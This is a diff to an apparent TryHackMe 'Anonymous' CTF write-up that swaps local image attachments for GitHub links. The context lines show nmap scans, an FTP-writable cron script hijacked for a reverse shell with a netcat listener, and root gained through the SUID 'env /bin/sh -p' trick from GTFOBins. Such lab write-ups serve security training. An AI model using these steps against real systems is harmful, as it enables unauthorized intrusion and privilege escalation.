@@ -11,7 +11,7 @@ Started with a full port scan.
 nmap -sS --min-rate 5000 -p- 10.201.43.68
 ```
 
-![image.png](attachment:40bd0e7b-788f-4b75-881e-46683f1045dd:image.png)
+![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 4 open ports found — the answer to Q1. The remaining 65,531 were closed or filtered.
 
@@ -30,7 +30,7 @@ Service version scan next:
 nmap -sC -sV -p 21,22,139,445 10.201.43.68
 ```
 
-![image.png](attachment:8a3c3554-bb02-4748-9223-48bd91bc0197:image.png)
+![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 Answers to Q2 and Q3 appeared immediately. Also noteworthy: the hostname came back as "ANONYMOUS" — a very obvious hint toward anonymous access.
 
@@ -81,7 +81,7 @@ ftp> get to_do.txt
 
 `clean.sh` contents:
 
-![image.png](attachment:e964780f-2a37-464f-a741-80415cdfc188:image.png)
+![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 ```bash
 #!/bin/bash
@@ -107,11 +107,11 @@ What it does:
 
 This script is almost certainly running automatically on a schedule.
 
-![image.png](attachment:2f696ee3-d03c-4677-8fc4-8fa05452dd67:image.png)
+![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 `removed_files.log` had "Running cleanup script: nothing to delete" repeated dozens of times. No timestamps, but the repetition clearly showed `clean.sh` was firing periodically. The very recent last-modified time backed that up.
 
-![image.png](attachment:ae6bfd29-e502-4dd8-a1ab-5aa3c2c75f98:image.png)
+![5](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 `to_do.txt`:
 
@@ -147,7 +147,7 @@ Payload breakdown:
 
 10.9.0.106 is my VPN (tun0) address.
 
-![image.png](attachment:2fc70af7-b564-433b-96a0-6e51530b2192:image.png)
+![6](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 Uploaded via FTP:
 
@@ -167,7 +167,7 @@ Set up a netcat listener:
 nc -lvnp 4444
 ```
 
-![image.png](attachment:6ac955f3-da94-4c8f-8627-1d7a1ae1583c:image.png)
+![8](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 After about 1–5 minutes, the reverse shell connected:
 
@@ -178,7 +178,7 @@ Connection received on 10.201.43.68 40760
 
 ###
 
-![image.png](attachment:0dca7339-3d33-4a6b-9852-6b43b40a0877:image.png)
+![9](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 Checked my position:
 
@@ -211,7 +211,7 @@ Time to escalate. Searched for SUID binaries — files that execute with their o
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![image.png](attachment:820723d9-8a9f-4ff9-9c9e-9f82a82eb844:image.png)
+![10](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 Results:
 
@@ -226,7 +226,7 @@ Results:
 
 GTFOBins (https://gtfobins.github.io/) documents how to exploit Unix binaries to bypass security controls. From the SUID section for `env`:
 
-![image.png](attachment:54dd8c6a-7a70-4bd7-ad7b-acd3054564c0:image.png)
+![11](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 ```bash
 /usr/bin/env /bin/sh -p
@@ -240,7 +240,7 @@ Breakdown:
 
 When env runs with SUID it inherits root. Launching `/bin/sh -p` through it gives a root shell. The `-p` flag is essential — without it, the shell drops back to the real user's permissions.
 
-![image.png](attachment:8c050e7b-54f4-4030-9a5b-0259943ffb6c:image.png)
+![12](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 ```bash
 whoami
